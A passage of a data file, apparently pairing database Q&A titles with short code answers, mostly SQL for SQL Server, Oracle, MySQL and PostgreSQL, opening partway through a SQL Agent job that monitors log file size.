            @category_name=N'[Uncategorized (Local)]', 
            @owner_login_name=@AdminUserName, 
            @notify_email_operator_name=@Operator, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [Monitor Logfile Size]    Script Date: 08/02/2012 15:39:11 ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Monitor Logfile Size', 
            @step_id=1, 
            @cmdexec_success_code=0, 
            @on_success_action=1, 
            @on_success_step_id=0, 
            @on_fail_action=2, 
            @on_fail_step_id=0, 
            @retry_attempts=0, 
            @retry_interval=0, 
            @os_run_priority=0, @subsystem=N'TSQL', 
            @command=N'Declare @LogSize int;
Declare @LogName varchar(255);
Declare @LogFile varchar(2000);

select  Top 1 @LogName=name,@LogFile=physical_name,@LogSize = convert(float,size) * 8192 / (1024 * 1024) from    sys.master_files
where   type_desc = ''LOG'' Order by size desc

IF (@LogSize > 10240)
BEGIN
Declare @AlertString varchar(5000)
set @AlertString = @LogName + '' : '' + @LogFile + '' has reached a size of '' + Convert(varchar(20),@LogSize) + '' MB.''
RAISERROR(@AlertString, 18,1) with LOG
END
ELSE
BEGIN
RAISERROR(''Transaction Log monitoring complete'', 0, 1)
END', 
            @database_name=N'master', 
            @flags=4
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'Hourly Logfile Check', 
            @enabled=1, 
            @freq_type=4, 
            @freq_interval=1, 
            @freq_subday_type=8, 
            @freq_subday_interval=1, 
            @freq_relative_interval=0, 
            @freq_recurrence_factor=0, 
            @active_start_date=20120802, 
            @active_end_date=99991231, 
                @active_start_time=0, 
            @active_end_time=235959, 
            @schedule_uid=N'18435d90-4ca0-4c7a-a8a9-c81f347ba32c'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO
"
18021,45038,oracle join query issue,"  select sid, STUDENT_NAME name, count(sid) 
    from attendance 
         join student on STUDENT_ID= sid 
   where present=1 
group by sid, STUDENT_NAME 
order by sid;
"
13871,73836,Is it possible to get the column length in a mysql database?,"select id, name, LENGTH(NAME) from foo
"
36596,61911,Oracle 10g OS Authentication fails in SQL Plus,"SQLNET.AUTHENTICATION_SERVICES= (NTS)
"
19272,11135,Insert by select statement -oracle,"UPDATE STUDENTS
SET    AMOUNT = (SELECT SUM(PAYMENTS.AMOUNTS)
                 FROM   PAYMENTS
                 WHERE  PAYMENTS.RNO = STUDENTS.RNO);
"
204,61179,How to archive tables in MySQL InnoDB,"mysqldump --defaults-extra-file=/home/username/.my.cnf database table > table.sql
"
33063,32955,SQL COUNT users with MIN date of login?,"select count(*)
from (SELECT user
      FROM table
      GROUP BY user
      HAVING MIN(login_date) = '10/3'
     ) t
"
10956,26883,Oracle SQL suming value without using aggregate function,"SELECT DISTINCT SUM(price) OVER ()
  FROM item
"
872,9262,Join two tables with max aggregation on one table,"SELECT c.ID, d.BookPrice, d.PriceDate 
FROM Material as c
INNER JOIN
    (SELECT MaterialID, BookPrice, PriceDate 
     FROM Price as a
     WHERE PriceDate = 
          (SELECT MAX(PriceDate) 
           FROM Price as b 
           WHERE a.MaterialID = b.MaterialID
          )
    ) as d 
ON c.ID = d.MaterialID
"
3406,9210,Connect to remote server in T-SQL (SQL server 2008),"EXEC sp_addlinkedserver 'MyOtherServer', N'SQL Server'


EXEC sp_addlinkedsrvlogin 
   'MyOtherServer', 
   'false', 
   'OtherServerDomain\DomainUser', 
   'DomainUserName', 
   'DomainPassword'
"
5331,7956,Oracle SQL extractvalue from multiple elements,"SELECT 
    t.recid
    ,t2.VALUE1 
    ,t3.VALUE2 
    ,t4.VALUE3 
FROM t
INNER JOIN XMLTABLE('/row/c1'
    PASSING t.xmlrecord
    ID_NUM VARCHAR(4) path 'concat(substring(ancestor-or-self::*/name(.),1,1), @m)',
    VALUE1 VARCHAR(20) path '.') t2
ON (1=1)
INNER JOIN XMLTABLE('/row/c2'
    PASSING t.xmlrecord
    ID_NUM VARCHAR(4) path 'concat(substring(ancestor-or-self::*/name(.),1,1), @m)',
    VALUE2 VARCHAR(20) path '.') t3
ON (t2.ID_NUM=t3.ID_NUM)
INNER JOIN XMLTABLE('/row/c3'
    PASSING t.xmlrecord
    ID_NUM VARCHAR(4) path 'concat(substring(ancestor-or-self::*/name(.),1,1), @m)',
    VALUE3 VARCHAR(20) path '.') t4
ON (t2.ID_NUM=t4.ID_NUM)
"
3802,4382,"ERROR: column of relation does not exist PostgreSQL ,Unable to run insert query","insert into tester3 (""UN0"", ""UN1"")
     values ( 1, 'jishnu1');
"
17399,6902,Programmatically determine how many parameters in a stored procedure,"declare @ProcedureName sysname;
set @ProcedureName = '[dbo].[YourProcedureName]';

select  sp.name, 
        spa.name, 
        spa.is_output 
from    sys.procedures sp
join    sys.parameters spa on
        sp.object_id = spa.object_id
where   sp.object_id = object_id(@ProcedureName);
"
10414,34226,PostgreSQL sum quantity of children items,"SELECT
  d.date, 
  sum(CASE WHEN di.item_id = 1 THEN di.quantity ELSE 0 END) as ""Bread"",
  sum(CASE WHEN di.item_id = 2 THEN di.quantity ELSE 0 END) as ""Eggs"",
  sum(CASE WHEN di.item_id = 3 THEN di.quantity ELSE 0 END) as ""Coffee""
FROM deliveries d
JOIN delivery_items di ON di.delivery_id = d.id
GROUP BY d.date
ORDER BY d.date
"
29551,5552,Determining whether a month contains entries,"SELECT DISTINCT
    CASE
        WHEN EXTRACT(MONTH FROM logdate) IS  NULL THEN false
        ELSE true
    END,
    y AS month
FROM
    mytable 
        RIGHT JOIN 
        (SELECT generate_series(1,12)) AS x(y) ON ((EXTRACT(MONTH FROM logdate)) = y AND EXTRACT(YEAR FROM logdate) = '2009')
ORDER BY 
    month ASC;
"
16692,12402,Can't get SQL query to turn values in column for same ID into a single row with their own columns,"DECLARE @Temp TABLE(ID INT, attribute_name VARCHAR(25), attribute_value VARCHAR(25))
INSERT INTO @Temp
VALUES(1, 'attr1', 'val1'), 
(1, 'attr2', 'val2'), 
(1, 'attr3', 'val3'), 
(2, 'attr1', 'val4'), 
(2, 'attr2', 'val5'), 
(2, 'attr3', 'val6')

SELECT *
    FROM (
        SELECT ID, attribute_name, attribute_value
            FROM @Temp
        ) p
        PIVOT
        (
            MAX(attribute_value)
            FOR attribute_name IN
            (attr1, attr2, attr3)
        ) AS pvt
            ORDER BY pvt.ID
"
1439,25733,get references table name and table column,"select cols1.column_name
, r1.constraint_name
, r1.constraint_type 
, cols2.table_name
, cols2.column_name
from all_constraints r1
,    all_cons_columns cols1
,    all_cons_columns cols2
WHERE r1.constraint_name = cols1.constraint_name
AND   r1.owner = cols1.owner
and   r1.r_owner = cols2.owner(+)
and   r1.r_constraint_name = cols2.constraint_name(+)
AND cols1.table_name = 'EMPLOYEES' 
AND r1.owner = 'HR' 
/
"
6316,73481,"MySQL String Manipulations: Change the 5th character, counting from the end","update your_table
set col = replace(col, 'm.jpg', 'b.jpg')
"
23702,1562,selecting more than one row of matching data,"SELECT r.cid
  FROM rented r
  JOIN copy p ON r.copyid = p.copyid
 GROUP BY r.cid, p.mid
 HAVING COUNT(DISTINCT c.bid) > 1
"
24729,55146,Running totals in a SQL view,"WITH transactionTotal AS
(
   SELECT t.Created, t.Description, t.Credit, t.Debit, t.TransDate, t.TransactionID, a.AccountID
      , ROW_NUMBER() OVER (ORDER BY TransDate ASC) AS RowNumber
      , ( ISNULL(t.Credit, 0) - ISNULL(t.Debit, 0) ) AS TransactionTotal
   FROM dbo.Transactions AS t 
   INNER JOIN dbo.BankAccounts AS a ON t.AccountID = a.AccountID
)
SELECT t.Created, t.Description, t.Credit, t.Debit, t.TransDate, t.TransactionID, t.AccountID
   , ( SELECT SUM(tt.TransactionTotal)
       FROM transactionTotal AS tt
       WHERE tt.RowNumber <= t.RowNumber) AS RunningTotal
FROM transactionTotal AS t
LEFT JOIN transactionTotal AS tt ON t.RowNumber = tt.RowNumber + 1
ORDER BY t.TransDate DESC
"
27160,10212,How do I clone an entity that has a client-generated GUID as its ID? (Model-first),"INSERT INTO dbo.SomeTable(ID, Col1, Col2, ...., ColN)
   SELECT
       NEWID(), -- get a new GUID for the new row
       Col1, Col2, ...., ColN
   FROM 
       dbo.SomeTable
   WHERE
       ID = (some value defined here)
"
35137,44351,Should I define the primary key for each entity in Realm?,"@interface MyObject : RLMObject

@property NSString *uuid;

@end

@implementation MyObject

+ (NSString *)primaryKey
{
   return @""uuid"";
}

+ (NSDictionary *)defaultPropertyValues
{
   @{@""uuid"": [[NSUUID UUID] UUIDString]};
}

@end
"
18808,2701,how to get hours from subtracting two time values in SQL Server 2008,"CREATE Function [dbo].[udf_Elapsed] (@Date1 DateTime,@Date2 DateTime)

Returns Varchar(150)
As

Begin
    Declare @sec int,@hour int,@minut int,@days int 
    SET @sec = DATEDIFF (SECOND,@Date1,@Date2)
    Set @days = @sec / 86400
    Set @sec = @sec - (@days * 86400)
    Set @hour = @sec / 3600
    Set @sec = @sec - (@hour * 3600)
    Set @minut = @sec / 60
    Set @sec = @sec - (@minut * 60)
    Return right(concat('000',@days),3)+':'+right(concat('00',@hour),2)+':'+right(concat('00',@minut),2)+':'+right(concat('00',@sec),2)
End


Select [dbo].[udf_Elapsed] ('2016-05-05 10:30','2016-05-05 15:59')
"
29197,22245,Selecting Same Column Twice Using Alias Table,"SELECT DISTINCT Req.RequirementID,  Ws.Wsnm, 
MAX(company1_id.ee_id) as Company1_Lead, MAX(company2_id.ee_id) as Company2_Lead,
FROM (((([_Requirements] AS Req 
INNER JOIN [_Workstream] AS Ws ON Req.fkOwningWsID = Ws.pkWsID)
INNER JOIN [mnWorkstream_Leads] AS wsLeads ON Ws.pkWsID = wsLeads.fkWsID)
LEFT OUTER JOIN qryTrackerAllEeList AS company1 ON wsLeads.fkEeID = company1.Company1_ID)
LEFT OUTER JOIN qryTrackerAllEeList AS company2 ON wsLeads.fkEeID = company2.Company2_ID)
GROUP BY req.RequirementID, Ws.Wsnm
"
38134,1927,Export mysql schema (data only) except for one table,"#/bin/bash

now=$(date +%Y-%m-%d-%H:%M:%S)
output_file=""mydb_prod-$now.sql""

mysqldump -u root -p[pass] -h localhost mydb_prod --add-drop-table --no-data > ""$output_file""
mysqldump -u root -p[pass] -h localhost mydb_prod migration_table --add-drop-table >> ""$output_file""
"
30869,10441,Query for changing the id to name from two different tables,"select distinct a.name,b.name 
from c 
inner join b using(b_id) 
inner join a using(a_id)
"
7518,34484,Combining resultset to get one row,"SELECT
NodeId
,NodeName
,max(convert(int,CanAdd))
,max(convert(int,CanDelete))
,max(convert(int,CanEdit))
,max(convert(int,CanView))
from yourtable
group by
NodeId, NodeName
"
33281,32541,Upgrading a varchar column to enum type in postgresql,"alter table foo 
  ALTER COLUMN varcharColumn TYPE enum_type using varcharColumn::enum_type;
"
26216,54151,MySql: how to create temp table by using dynamic select statement?,"declare  strwhere varchar(30);
if hour(now()) >= 16 and minute(now()) >=30 then
    set strwhere = ' CURDATE() + INTERVAL 1 DAY ';
else 
    set strwhere = '  CURDATE() ';
end if;
set @query = concat(""CREATE TEMPORARY TABLE table2 AS
                    SELECT  pc.customerid,
                    deliverytimespanid,
                    pc.id,
                    ca.districtid,
                    pc.status,
                    pc.orderid,
                    deliverydatetime
                from packages as pc
                inner join  customeraddresses as ca on ca.id = pc.addressid
                where pc.status = 1
                and pc.deliverydatetime ="",strwhere,""
                );

prepare resultset from @query;
execute resultset;
deallocate prepare resultset;
"
34098,63750,For the same value it should be incremented by 1 and different it should be reset and gives result,"SELECT BPIN, Name, @value:=IF(@bpin=BPIN, @value + 1, 1) AS value, @bpin:=BPIN
FROM 
(
    SELECT BPIN, Name
    FROM some_table
    ORDER BY BPIN, Name
) sub0
CROSS JOIN (SELECT @value:=0, @bpin:=0) sub1
"
29155,20637,"Is it possible to use just one Qt module, just like a 3rd party dll?","qt += core sql
"
24816,70790,SQL UNION ALL with a INNER JOIN,"select
    coalesce(table1.dwg,table2.dwg),
    table1.part,
    table1.qty,
    table2.order,
    table2.part,
    table2.qty,
from table1
full outer join table2 on 
    table1.dwg = table2.dwg and
    table1.part = table2.part
"
9731,22484,How can I move a column from one table to a new table?,"  CREATE TABLE Employee(
  emp_id int,
  name nvarchar(50),
  address nvarchar(50),
  city nvarchar(50),
  PRIMARY KEY (emp_Id));

ALTER TABLE Employee
ADD address_id int NOT NULL IDENTITY;

INSERT INTO EMPLOYEE(emp_id,name,address,city) VALUES (111,'JOHN','XXX STREET','XYZ');

CREATE TABLE Address(
   address_id int NOT NULL,
   address nvarchar(100),
   city nvarchar(100),
   PRIMARY KEY (address_id)
  );

INSERT INTO Address (address_id, address, city)
SELECT address_id, address, city
FROM Employee;

ALTER TABLE Employee
DROP COLUMN address;

ALTER TABLE Employee
DROP COLUMN city;
"
11341,32035,Referential integrity over table portion,"ALTER TABLE MissionRollAssignments
 ADD CONSTRAINT fk1 FOREIGN KEY (GroupId, Memberid)
 REFERENCES GroupMembers (GroupId, Memberid);

ALTER TABLE MissionRollAssignments
 ADD CONSTRAINT fk2 FOREIGN KEY (GroupId, MissionId)
 REFERENCES Missions (GroupId, MissionId);
"
32058,58772,SQL Combine 2 rows into 2 columns,"SELECT Entity,
       MAX(CASE WHEN Type=Auto THEN Value ELSE NULL END) AS ValueAuto,
       MAX(CASE WHEN Type=Manual THEN Value ELSE NULL END) AS ValueMaual
FROM tableName
GROUP BY Entity
"
17973,3120,SQLite SELECT not returning anything,"SELECT Fname, Lname 
FROM EMPLOYEE 
WHERE dno = 4 
  AND Ssn IN (SELECT essn FROM WORKS_ON);
"
616,59315,Updating columns values from another table SQL,"USE [Target_Database]
GO

UPDATE t
 SET t.iexp  = S.iexp 
FROM K_monster t 
INNER JOIN [Source_Database].[Schema].[K_monster] S 
ON t.ID = S.ID
GO
"
17755,3706,Subselect in pgSQL,"SELECT id FROM (SELECT * FROM table) AS aliasname;
"
34793,21819,MySQL: Grabbing only the users that has only one row?,"SELECT users.*
FROM users
INNER JOIN roles_users ON users.id = roles_users.user_id 
-- replace by IN (1, 4) if needed
WHERE roles_users.role_id IN (1)
AND NOT EXISTS (SELECT 1 FROM roles_users
                 WHERE roles_users.user_id = users.id
                    -- replace by NOT IN (1, 4) if needed
                   AND roles_users.role_id NOT IN (1))
GROUP BY users.id
HAVING COUNT(*) = 1
"
16114,28231,False Negative: Job Step History,", case when MAX(s.last_run_date) > 0 then
      case s.last_run_outcome
          when 1 then 'Success'
          when 0 then 'Failed'
          when 3 then 'Cancelled' end
      else 'Never Ran' end as [StepStatus]
"
5956,47337,Replace original srids with new ones,"WITH ranked AS (
  SELECT
    *,
    rank = ROW_NUMBER() OVER (PARTITION BY uid ORDER BY srid)
  FROM Table1
)
UPDATE t2
SET srid = new.srid
FROM Table2 t2
  INNER JOIN ranked old ON old.uid = 1 AND old.srid = t2.srid
  INNER JOIN ranked new ON new.uid = 2 AND new.rank = old.rank
"
34024,56452,Deleting Extended Properties of a column,"USE AdventureWorks2008R2;
GO
SELECT major_id, minor_id, t.name AS [Table Name],
       c.name AS [Column Name],
       value AS [Extended Property]
  FROM sys.extended_properties AS ep
 INNER JOIN sys.tables AS t ON ep.major_id = t.object_id 
 INNER JOIN sys.columns AS c ON ep.major_id = c.object_id
       AND ep.minor_id = c.column_id
 WHERE class = 1;
GO
"
7541,16953,Grouping query into group and subgroup,"df <- read.table(text=""Area_code  Subarea_code  Company   Result
10         101           A         15
10         101           P         10
10         101           C         4
10         102           A         10
10         102           P         8
10         102           C         5
11         111           A         15
11         111           P         20
11         111           C         5
11         112           A         10
11         112           P         5
11         112           C         10"", header=TRUE)

library(sqldf)
mymax <- sqldf(""select Company,
                  Area_code,
                  max(Subarea_code) Largest_subarea_code
                  from df
                  group by Company,Area_code"")
mymaxres <- sqldf(""select d.Company,
                          d.Area_code,
                          m.Largest_subarea_code,
                          d.Result
                  from df d, mymax m
                  where d.Company=m.Company and
                        d.Subarea_code=m.Largest_subarea_code"")

mymin <- sqldf(""select Company,
                  Area_code,
                  min(Subarea_code) Smallest_subarea_code
                  from df
                  group by Company,Area_code"")
myminres <- sqldf(""select d.Company,
                          d.Area_code,
                          m.Smallest_subarea_code,
                          d.Result
                  from df d, mymin m
                  where d.Company=m.Company and
                        d.Subarea_code=m.Smallest_subarea_code"")
result <- sqldf(""select a.*, b.Smallest_subarea_code,b.Result
                from mymaxres a, myminres b
                where a.Company=b.Company and 
                      a.Area_code=b.Area_code"")
"
17877,70352,select one row on condtion,"CREATE VIEW rklib.clspaytp AS 
    Select *
    from rklib.clspaytpp
    where ottrnc='001'
    union

    select *
    from 
    (
    select *
    from rklib.clspaytpp
    where ottrnc != '001'
    limit 1
    ) x
"
33983,27310,Selec row between certain range of date,"SELECT * 
FROM `reservations`  `res` 
WHERE ('2012-05-03' 
   NOT BETWEEN res.expected_checkin_date AND res.expected_checkout_date) 
 AND COALESCE('2012-05-08' 
   NOT BETWEEN res.expected_checkin_date AND res.expected_checkout_date) 
"
61,51868,MySQL query help,"SELECT t.name, u.lang
FROM tags t
JOIN users u ON ( u.id = t.user_id )
LEFT JOIN images_urls iu ON ( iu.name=t.name AND iu.lang=u.lang )
WHERE iu.name IS NULL
"
2760,18441,Dynamically order columns in SQL,"       DECLARE @ItemCode nvarchar(50) = 'ITEM-000001'
       DECLARE @Code1 nvarchar(50)
       DECLARE @Code2 nvarchar(50)
       DECLARE @Code3 nvarchar(50)

        SELECT TOP 1
               @Code1 = ii.AttributeCode1
             , @Code2 = ii.AttributeCode2
             , @Code3 = ii.AttributeCode3
          FROM @AttributeTable ii
         WHERE ii.ItemCode = @ItemCode

        SELECT ii.ItemCode
             , @Code1 as [AttributeCode1]
             , CASE WHEN ii.AttributeCode1 = @Code1 THEN ii.Attribute1 
                    WHEN ii.AttributeCode2 = @Code1 THEN ii.Attribute2 
                    WHEN ii.AttributeCode3 = @Code1 THEN ii.Attribute3
                    ELSE null END as [Attribute1]
             , @Code2 as [AttributeCode2]
             , CASE WHEN ii.AttributeCode1 = @Code2 THEN ii.Attribute1 
                    WHEN ii.AttributeCode2 = @Code2 THEN ii.Attribute2 
                    WHEN ii.AttributeCode3 = @Code2 THEN ii.Attribute3
                    ELSE null END as [Attribute2]
             , @Code3 as [AttributeCode3]
             , CASE WHEN ii.AttributeCode1 = @Code3 THEN ii.Attribute1 
                    WHEN ii.AttributeCode2 = @Code3 THEN ii.Attribute2 
                    WHEN ii.AttributeCode3 = @Code3 THEN ii.Attribute3
                    ELSE null END as [Attribute3]
          FROM @AttributeTable ii
         WHERE ii.ItemCode = @ItemCode
      ORDER BY [AttributeCode1], [Attribute1]
             , [AttributeCode2], [Attribute2]
             , [AttributeCode3], [Attribute3]
"
9307,31415,SQL limit by group by,"select id, lat, lon, trajectory_id, time
from
(
  select 
    mytable.*, 
    row_number() over (partition by trajectory_id order by time) as rn
  from mytable
) numbered
where rn = 1;
"
29735,37858,How to separate boolean column values on mysql,"select candidate,
    sum(voteup) as 'vote up',
    sum(voteup=0) as 'vote down',
    sum(if(voteup,1,-1)) as 'vote points'
from votes
group by candidate;
"
23718,64963,"I have a users table and amount table, I would like to show all users with amount even when the amount is null or zero","SELECT u.Id,u.FirstName,u.LastName,u.Email,SUM(a.Amount) Amount 
FROM   users u LEFT JOIN amount a ON i.ID = a.ID
       AND a.ExpenseDate >= '2013-05-12' 
GROUP  BY u.Id
"
16907,59017,Oracle group/count query,"with t2 as (
    select  ColA2, ColB2, count(*) cnt 
    from TableTwo
    group by ColA2, ColB2 
)
select t1.Id1,
(  select max(cnt) MaxDup
   from t2
   where t2.ColA2=t1.Id1)
from TableOne t1
"
14983,48756,Validating empty xml by xsd in SQL Server,"declare @x xml(document dbo.xsdTest)
set @x = '' -- error here
"
12759,69145,SQL Count from INNER JOIN,"SELECT COUNT(*) FROM (
    SELECT COUNT(table1.act) AS actCount FROM table1
    INNER JOIN table2 ON table1.act = table2.act
    GROUP BY table1.act
) t
"
4258,58647,Delete rows from table,"delete from TF
where WORD='of' OR WORD='and' OR WORD='the';
"
16517,36737,PostgreSQL - querying records between the values of two different columns,"SELECT reports.* FROM reports
WHERE 
reports.time >= '2013-03-20 15:21:05.379941' 
AND reports.time <= (
    SELECT min(r2.time) from reports r2 
    INNER JOIN alerts ON alerts.report_id = r2.id 
    INNER JOIN alert_codes ON alert_codes.id = alerts.code 
    WHERE r2.time >= '2013-03-20 15:21:05.379941' 
    AND alert_codes.name = 'Inside fence')
"
1360,52343,Firebird SQL: Subquery within an ALTER statement?,"execute BLOCK 
as declare variable stmt VARCHAR(2500) = 'SELECT ''ALTER TABLE MYTABLE myTable DROP CONSTRAINT ''|| rc.rdb$constraint_name||'';'' FROM   rdb$relation_constraints rc
           join rdb$check_constraints cc
           on rc.rdb$constraint_name = cc.rdb$constraint_name WHERE  rc.rdb$constraint_type   = ''NOT NULL''
           and rc.rdb$relation_name = ''MYTABLE''
           and cc.rdb$trigger_name  = ''ACOLUMN'''; 
begin   
  execute STATEMENT stmt; 
end;
"
6920,24212,Why is WHERE condition ignored in LEFT JOIN?," ON shareItems.itemID = likeTable.itemID
 WHERE shareItems.itemType = 2
"
12319,17437,using $group and $match (with range of date) functions in pymongo query,"user.aggregate([
   {""$match"": {'timeCreated':{ ""$gte"":date_yesterday, ""$lt"":date_today } }},
   {'$group':{'_id': ""$organization"",'count':{""$sum"": 1 } }}
])
"
31627,67130,How to change a Radgrid column value after binding?,"// Normal Mode
if (e.Item is GridDataItem)
{
    GridDataItem item = (GridDataItem)e.Item;
    item[""IsShadow""].Text = ""Your new text"";
}

// Edit Mode
if ((e.Item is GridEditableItem) && (e.Item.IsInEditMode))
{
    GridEditableItem editItem = (GridEditableItem)e.Item;
    (editItem[""IsShadow""].Controls[0] as TextBox).Text = ""Your new text"";
}
"
19752,49224,oracle trigger synthetic key,"CREATE OR REPLACE TRIGGER entity_Id_TRG BEFORE INSERT OR UPDATE ON entity
FOR EACH ROW
BEGIN
  if inserting and :new.attribute_1 is NULL then
  SELECT attribute_1_SEQ.nextval into :new.attribute_1 FROM DUAL;
  end if;

END;
"
6081,18053,"SQL: Count each record, starting with the oldest to newest appointment","SELECT id
      ,[date]
      ,type
      ,ROW_NUMBER() OVER (PARTITION BY ID ORDER BY [date] ) AS seq
FROM  Appointment
WHERE Type = 'Post-op'
"
30004,71732,Default values when NULL,"From 
       users u
       INNER JOIN Menu m
       ON (u.RoleID in (1,3) and m.roleID  is Null)
          or u.UserId = m.userId
          or u.RoleId = m.RoleId
"
10308,45589,Get users with first image of user if this have images sql,"SELECT Users.name, COALESCE(Images.id, $DEFAULT_IMAGE_ID)
FROM   Users
LEFT OUTER JOIN Images
    Users.id = Images.id_user
WHERE Images.id is NULL
   OR Images.id = (
       SELECT MIN(ID) FROM Images WHERE Users.id = Images.id_user
   )
"
21521,25122,Show unique (differentiating) data in a duplicate search in Access?,"select t1.col1, t1.col2,
       t1.col3, t1.col4,
       count(*)                    -- number of identical rows based on cols
from   tbl t1
inner join tbl t2 on t2.col1 = t1.col1 -- same col1
                 and t2.col2 = t1.col2 -- same col2
                 and t2.id <> t1.id    -- but not the same pkey
group by t1.col1, t1.col2,
         t1.col3, t1.col4          -- merge when col3 and col4 are the same
"
21918,41625,SQL order dates sequentially by year,"Select [Date], [Number], 
       Row_Number() over (PARTITION BY Year([DATE] order by [DATE]) as WEEK_IN_YR
  from [table]
order by WEEK_IN_YR, [Date]
"
11538,53363,SUM and FORMAT combined MYSQL," SELECT FORMAT(SUM(cost), 2)
 FROM table;
"
34475,41691,I am Trying to Combine Two Table (Master And Child) In One.I need Only One Record Of Child Table in Storeprocedure,";WITH cte AS
 (
  SELECT ROW_NUMBER() OVER (PARTITION BY propertyId ORDER BY imageId) AS rn,
         propertyId, title, imageFile
  FROM Property p JOIN propertyImage pr ON p.propertyId = pr.FK_propertyId
  )
  SELECT propertyId, title, imageFile
  FROM cte
  WHERE rn = 1
"
23406,29237,"Trouble with SELECT WHERE NOT IS/EXISTS Subquery (VB.NET, Access)"," Private Sub dtpStartDate_ValueChanged(sender As Object, e As EventArgs) Handles dtpStartDate.ValueChanged
        startDateChanged = 1

        If endDateChanged = 1 Then
            cbLocation.Enabled = True
            Me.Refresh()
            cbLocation.Items.Add(New ListViewItem(""""))
            Dim unbookedLocationsSQL As String = ""SELECT * FROM Locations WHERE LocationID NOT IN (SELECT LocationID FROM Bookings WHERE bookingEndDate >= @startDate AND bookingStartDate <= @endDate)""
            Dim unbookedLocationsCommand = New OleDbCommand(unbookedLocationsSQL, globalVariables.objConnection)
            Dim unbookedLocationsAdapter As New OleDbDataAdapter(unbookedLocationsSQL, globalVariables.objConnection)
            Dim unbookedLocationsDataSet As New DataSet

            unbookedLocationsCommand.Parameters.AddWithValue(""startDate"", dtpStartDate.Value)
            unbookedLocationsCommand.Parameters.AddWithValue(""endDate"", dtpEndDate.Value)
            unbookedLocationsAdapter.SelectCommand = unbookedLocationsCommand
            unbookedLocationsAdapter.Fill(unbookedLocationsDataSet, ""Locations"")

            With cbLocation
                .DataSource = unbookedLocationsDataSet.Tables(""Locations"")
                .DisplayMember = ""LocationName""
                .ValueMember = ""LocationID""
            End With
        End If
    End Sub
"
973,19833,Developing a recursive/hierarchy query,"WITH Son
AS
(
    SELECT
        FK_CC_A AS Father,
        FK_CC_B AS Son
    FROM
        PG_Rols_CC
    UNION ALL
    SELECT
        f.Father,
        s.FK_CC_B AS Son
    FROM
        Son f
        INNER JOIN PG_Rols_CC s ON f.Son = s.FK_CC_A
)

SELECT * FROM Son
"
7761,55643,Multi-join 'gotohell' update,"merge into equipment tgt
using (select eq.equipmentoid,
              ho.hook_office_letter || lpad(khc.hook_no, 5, '0') as hookno,
              eq.location_description as eqloc
       from key_hook_current khc 
           inner join key_holding kho                on khc.key_holdingoid = kho.key_holdingoid
           inner join contract con                   on kho.customeroid = con.customeroid
           inner join vw_current_contract_period ccp on con.contract_id = ccp.contract_id
           inner join contract_period cp             on (ccp.contract_id = cp.contract_id and ccp.contract_period = cp.contract_period)
           inner join contract_equip_period cep      on cp.contract_periodoid = cep.contract_periodoid
           inner join equipment eq                   on cep.equipmentoid = eq.equipmentoid
           inner join hook_office ho                 on khc.hook_officeoid = ho.hook_officeoid
       where
           eq.product_id = 'XXX' and
           (eq.location_description is null or
            ho.hook_office_letter || lpad(khc.hook_no, 5, '0') <> eq.location_description)) src
  on (tgt.equipmentoid = src.equipmentoid)
when matched then
update set tgt.location_description = src.hookno;
"
20846,29465,Isnull and data type in SQL Server,"select
  MyDate,
  CASE WHEN MyDate IS NULL THEN 1   ELSE 0 END As MyDateWibble,
  MyIs,
  CASE WHEN MyIs   IS NULL THEN 999 ELSE 0 END AS MyIsWibble
FROM
  Tab;
"
15518,49531,Should I be using CREATE VIEW instead of JOIN all the time,"It is a view that is more of a TABLE ...You can query it directly as other table..
"
26703,47194,Column to row conversion in teradata,"with cte as
 (
   select PROGRAM_ID, SOURCE_TABLE
   from tab
 )
SELECT *
FROM TABLE (STRTOK_SPLIT_TO_TABLE(cte.PROGRAM_ID, cte.SOURCE_TABLE, ',')
     RETURNS (PROGRAM_ID INTEGER,
              tokennum INTEGER,
              SOURCE_TABLE VARCHAR(128) CHARACTER SET UNICODE)
            ) AS d
"
3395,43968,MySQL - search for formatted conbinations of column values,"where `group` = substring_index(@Group_Article, '-', 1) + 0 AND
      `article` = substring_index(@Group_Article, '-', -1) + 0 
"
34367,51586,SQL time comparision,"where time(hour)>time(now()) or time(hour) = 0
"
8677,18266,Getting two sums from different tables with a joining table,"SELECT t1.ValueSum1, t2.ValueSum2
FROM JoinTable jt Left Join
     (SELECT Joiningvalue, SUM(Table1.Value1) as ValueSum1
      FROM Table1
      GROUP BY Joiningvalue
     ) t1
     On jt.ID = t1.Joiningvalue LEFT JOIN
     (SELECT Joiningvalue, SUM(Table2.Value1) as ValueSum2
      FROM Table2
      GROUP BY Joiningvalue
     ) t2
     On jt.ID = t2.JoiningValue;
"
14499,60466,SQL Server: merging multiple colums into 1 column,"select data1 from table1
union all
select data2 from table1
union all
...
select data3 from table2
"
13418,9578,SQL Join in the same table,"SELECT A.product_type
FROM product_table A
JOIN product_table B ON A.product_type = B.product_type
LEFT JOIN product_table C ON A.product_type = C.product_type
                         AND c.brand_id = 'C'
WHERE A.brand_id = 'A'
  AND B.brand_id = 'B'
  AND c.brand_id IS NULL
"
5685,35219,How to Update with a Self join?,"update results as r set
    status = 'W'
from (
    select t.seats, max(t.votes) as max_votes
    from results as t
    group by t.seats
) as a
where a.seats = r.seats and a.max_votes = r.votes; 
"
7944,2653,How to do WHERE ((SELECT COUNT(*) ...) = 0 OR EXISTS (SELECT * FROM ...))?,"SELECT *
  FROM Person p
 WHERE NOT EXISTS ( -- not a single person for the event
       SELECT *
         FROM PersonEvent
        WHERE eventID = '290')
    OR EXISTS ( -- the person for the event
       SELECT *
         FROM PersonEvent pe
        WHERE pe.personID = p.ID AND pe.eventID = '290')
"
11819,61657,Projection in Relational Algebra,"π name (σ age = 34 (Person)) 
"
